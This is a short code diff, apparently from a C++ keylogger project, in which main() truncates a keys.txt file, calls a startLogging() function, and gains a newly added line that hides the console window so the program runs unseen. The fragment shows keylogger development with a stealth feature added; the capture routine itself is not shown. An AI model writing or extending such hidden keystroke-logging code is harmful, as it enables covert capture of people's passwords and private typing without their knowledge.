@@ -8,6 +8,7 @@ using namespace std;
 void startLogging();
 
 int main(){
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
     startLogging();
     return 0; 
